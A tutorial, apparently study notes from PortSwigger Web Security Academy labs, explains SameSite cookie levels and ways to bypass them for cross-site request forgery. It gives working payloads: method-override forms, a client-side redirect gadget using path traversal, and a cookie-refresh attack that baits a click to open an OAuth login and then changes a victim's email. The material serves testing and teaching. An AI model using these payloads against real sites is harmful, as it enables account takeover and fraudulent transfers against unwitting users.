# Bypassing SameSite cookie restrictions

SameSite is a browser security mechanism that controls when cookies are sent in cross-site requests, providing protection against CSRF, cross-site leaks, and some CORS exploits.

Since 2021, Chrome defaults to Lax SameSite restrictions when websites don't explicitly set their own level. Other major browsers are expected to follow this standard, making it crucial to understand how these restrictions work and can be bypassed for thorough cross-site attack testing.

# 1. The basic

## 1.1 - What is a site

A site is defined as the top-level domain (TLD) plus one additional level (TLD+1), such as `.com` or `.net`. The URL scheme is also considered, so `http://app.example.com` to `https://app.example.com` is treated as cross-site.

## 1.2 - Difference between a site and an origin

**Site vs Origin:** A site encompasses multiple domain names, while an origin includes only one. Two URLs share the same origin if they have identical scheme, domain name, and port.

| https://example.com             | http://example.com                  | No: mismatched scheme            | No: mismatched scheme       |

## 1.3 - How SameSite work

**How does SameSite work?**

SameSite enables browsers and websites to limit which cross-site requests include specific cookies, reducing CSRF attack exposure. Previously, browsers sent cookies in every request to the issuing domain, even from unrelated third-party sites.

**SameSite Levels:**
* `Strict`
* `Lax` 
* `None`

Developers configure restriction levels using the `SameSite` attribute in the `Set-Cookie` header:
`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`

While SameSite provides protection against CSRF attacks, no restriction level offers guaranteed immunity.

**Note:**
> - If the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior. As this is a proposed new standard.

**Strict**
Cookies with `SameSite=Strict` are never sent in cross-site requests—only when the target site matches the browser's address bar. Recommended for sensitive cookies that enable data modification or access to authenticated pages. Most secure option but may impact user experience where cross-site functionality is needed.

**Lax**
Cookies with `SameSite=Lax` are sent in cross-site requests only when both conditions are met:
* Request uses `GET` method
* Request results from top-level user navigation (like clicking links)

Cookies are excluded from cross-site `POST` requests and background requests (scripts, iframes, images), providing protection against common CSRF attack vectors.

**None**
`SameSite=None` disables restrictions entirely—cookies are sent in all requests, including those from unrelated third-party sites. This is the default behavior for most browsers (except Chrome, which defaults to Lax).

Legitimate uses include third-party contexts that don't access sensitive data, like tracking cookies. However, investigate cookies with no restrictions, as some sites disable SameSite on all cookies as a workaround, potentially exposing sensitive ones.

`SameSite=None` requires the `Secure` attribute for HTTPS-only transmission, or browsers will reject the cookie.

`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`

# 2. Bypassing Example

## Bypassing SameSite Lax restrictions using GET requests (method overdrive)

Servers often accept both `GET` and `POST` requests to the same endpoint. If session cookies use Lax restrictions, CSRF attacks remain possible via `GET` requests that trigger top-level navigation.

Simple attack example:
```javascript
<script>
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Some frameworks allow method overriding through parameters like `_method`, enabling `POST` endpoints to be accessed via `GET`:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
<input type="hidden" name="_method" value="GET">
<input type="hidden" name="recipient" value="hacker">
<input type="hidden" name="amount" value="1000000">
</form>
```

Other frameworks support a variety of similar parameters.

`GET /my-account/change-email/?email=asd%40asd&_method=POST`

```
<html>
	<body>
		<form method="GET" action="https://something/my-account/change-email/?email=asd%40asd&_method=POST">
			<input type="hidden" name="email" value="asd@asd"/>
			<input type="hidden" name="_method" value="POST"/>
			<input type="submit" value="Submit">
		</form>
    <script>document.forms[0].submit();</script>
	</body>
<html>
```

## Bypassing SameSite restrictions using on-site gadgets (client-side redirect)

When cookies use `SameSite=Strict`, browsers block them from cross-site requests. However, you can bypass this by finding gadgets that trigger secondary requests within the same site.

A common gadget is client-side redirects that build redirection targets from attacker-controlled input like URL parameters. Browsers treat these as ordinary same-site requests rather than redirects, so they include all site cookies regardless of SameSite restrictions.

By manipulating such gadgets to create malicious secondary requests, you can completely bypass SameSite cookie protections.

**Note:**
> - Note that the equivalent attack is **`not possible`** with server-side redirects. In this case, browsers recognize that the request to follow the redirect resulted from a cross-site request initially, so they still apply the appropriate cookie restrictions.

**Example case:**
> - This attack would works if these 2 conditions are met
> - 1: The `change email POST request` can be change to `GET request` form.
> - 2: The target website has a DOM-based redirect function.

```<script>
document.location="https://0a430070035e9a3280aa0d9b005500d5.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=qweaaaasd@asd%26submit=1"
</script>
```

## Bypassing SameSite Lax restrictions with newly issued cookies (cookie refresh)

Cookies with `SameSite=Lax` normally block cross-site POST requests, but Chrome has exceptions for newly issued cookies.

When websites don't specify SameSite attributes, Chrome applies Lax restrictions by default but doesn't enforce them for the first 120 seconds on top-level POST requests to avoid breaking SSO mechanisms. This creates a two-minute vulnerability window.

**Note:** This exception only applies to cookies without explicit `SameSite=Lax` attributes.

Rather than timing attacks within this narrow window, you can force victims to receive new session cookies before attacking. OAuth login flows often issue fresh sessions since the service may not know if users are still logged in.

To refresh cookies without manual login, use top-level navigation to include OAuth session cookies, then redirect users back for the CSRF attack. Alternatively, trigger the refresh from a new tab to avoid leaving the original page.

Since browsers block popups by default, wrap the window.open() call in an onclick handler:
```
window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }
```

This only opens the popup when users click anywhere on the page.

**How to check for this kind:**
> - First, craft a normal payload to check if our theory from the start is correct.
> - The target website use `OAuth-based login`. Notice that if you visit, for example `/social-login`, this automatically initiates the full OAuth login flow, even you have already logged in.
> - Try doing this 2, 3 times. Notice that each time doing so, target site sets a new session cookie even if you were already logged in.
> - This mean that we can use this `/social-login` to csrf if our theory is correct.

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

**Explain:**
> - Browser block pop-up, so we'll have to bait by `<p>Click anywhere on the page</p>` and `window.onclick`
> - When the victim get baited, script opens the login URL. (target website use OAuth-based login and victim can quick access that website - like when we open facebook for example.)
> - The script then wait 5 seconds to give the login page time to complete the login process, then the form sends a POST request to change the victim’s email.
